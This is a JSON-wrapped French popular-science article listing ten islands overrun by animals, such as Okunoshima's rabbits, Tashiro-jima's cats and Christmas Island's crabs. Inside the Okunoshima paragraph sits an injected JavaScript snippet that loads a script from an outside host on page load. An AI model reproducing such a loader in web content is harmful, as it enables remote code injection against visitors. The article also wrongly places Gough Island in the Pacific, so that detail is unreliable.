{"title": "Top 10 des iles envahies par des animaux", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-05-02", "content": "Iles aux lapins, aux chats, aux cochons, aux singes ou aux poneys... A travers le monde, des animaux en liberte ont conquis des territoires insulaires, parfois jusqu'a les envahir. En voici dix exemples parmi les plus connus. Ce qu'il faut retenir Certaines especes peuvent pulluler sur une ile, en l'absence de predateurs. Ces iles sont souvent une attraction touristique. Le developpement excessif d'une espece peut desequilibrer l'ecosysteme. Souvent par accident et frequemment a cause des activites humaines, des iles ont pu etre envahies par une  espece  animale, attirant alors de nombreux touristes par leur originalite. Petit tour du monde de ces lieux tres particuliers. 1. Okunoshima (Japon) : l'ile aux lapins Okunoshima  est une ile japonaise situee au large d'Hiroshima, accessible en ferry. C'est sur cette ancienne base scientifique militaire qu'etaient testes des  gaz  toxiques utilises comme armes chimiques pendant la seconde guerre mondiale. L' ile  est aussi un lieu de memoire, elle abrite un musee qui retrace son passe.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les lapins ont desormais envahi l'espace, profitant de l'absence de predateurs. Deux hypotheses expliqueraient l'origine de ces lapins : ils pourraient etre les descendants des animaux servant a tester des produits toxiques ou seraient issus d'une petite population abandonnee sur l'ile par des ecoliers. Les lapins ont envahi l'ile Okunoshima. (c) Megumi, Fotolia                       2. Kauai (Hawai) : l'ile Jardin ou ile aux poules Kauai est une ile de l' archipel  d'Hawai qui a ete touchee par l' ouragan  Iniki en 1992, causant de nombreux degats et detruisant des elevages de poules. Les animaux disperses dans la nature se sont reproduits rapidement et, aujourd'hui, l'ile compte des milliers de coqs, poules et poulets errants. Des  scientifiques  se sont interesse au  genome  de ces poules pour retracer leur histoire evolutive. 3. Pig Beach (Bahamas) : l'ile aux verrats ou les cochons vont a la plage Les cochons qui se baignent a la plage de cette ile inhabitee des Bahamas (iles Exumas) sont une veritable attraction touristique. Mais debut 2017, une partie de ces cochons seraient morts, peut-etre en raison de la nourriture apportee par des touristes, comme le rapporte le  Washington Post . 4. Seal Island (Afrique du sud) : l'ile aux phoques  Seal Island  est une petite ile rocheuse d'Afrique du sud ou viennent se refugier des milliers d' otaries  a fourrure qui cherchent a echapper aux requins.  Les otaries se refugient sur leur ile, Seal Island, pour echapper aux requins. (c) anitasstudio, Fotolia                               5. Tashiro-jima (Japon) : l'ile aux chats  Les chats, plus nombreux que les humains sur cette ile, servaient autrefois a tuer les souris, capables de decimer les elevages de  vers a soie . Mais quand cette culture a disparu, la population de chats a grossi. Les  chiens  ne sont pas admis sur l'ile  Tashio-jima  qui accueille de nombreux touristes venant rendre visite aux chats. 6. Gough Island : une ile envahie par des souris Gough Island  est une ile inhabitee situee dans l'ocean Pacifique sud qui abrite des oiseaux rares, comme l' albatros  de Tristan da Cunha. Mais la  faune  locale est menacee par une  espece invasive  introduite accidentellement : des souris apportees par des marins au 19 e  siecle, qui ont colonise toute l'ile. Les  rongeurs  detruisent les oeufs. Un programme de preservation des especes menacees est en cours sur l'ile. 7. Miyajima (Japon) et ses daims Cette ile sacree du Japon abrite le  sanctuaire d'Itsukushima , mais aussi une population importante de  daims  qui ne sont pas effrayes par la presence des touristes. 8. Assateague Island (Maryland) et ses chevaux Assateague  est une ile des Etats-Unis (en Virginie) connue pour ses troupeaux de chevaux sauvages. Elle heberge une race de poney appele Chincoteague. Ces animaux seraient les descendants de chevaux domestiques retournes a l'etat sauvage. Des chevaux vivent en liberte sur Assateague. (c) James, Fotolia                               9. Cayo Santiago (Porto Rico) : l'ile aux singes Cayo Santiago  est une petite ile au large de la cote sud-est de Porto Rico qui abrite une station de recherche avec environ un millier de  macaques  rhesus en liberte. Les animaux sont les descendants directs de 409 singes amenes dans l'ile en 1938.  10. L'ile Christmas (Australie) et ses crabes Situee dans l'ocean Indien, cette ile australienne est un lieu de passage pour des migrants qui cherchent a gagner l'Australie. L' ile Christmas  heberge un centre de detention. Elle est connue pour une migration spectaculaire de  crabes  rouges qui quittent la foret pour aller vers la cote chaque annee d'octobre a novembre pour aller pondre. Le mystere de l'ile de Paques avec Antoine                       Antoine fait escale sur l'ile de Paques, Rapa Nui en polynesien, dans l'ocean Pacifique. Il nous fait decouvrir les statues geantes, ou moais, deconcertantes jusqu'a enflammer les imaginations. Aujourd'hui, comme nous le rappelle Antoine, l'inspiration qui nous vient devant cette terre desertifiee est celle d'un parallele avec notre planete, maltraitee par l'humanite.                                       ", "theme": "planete"}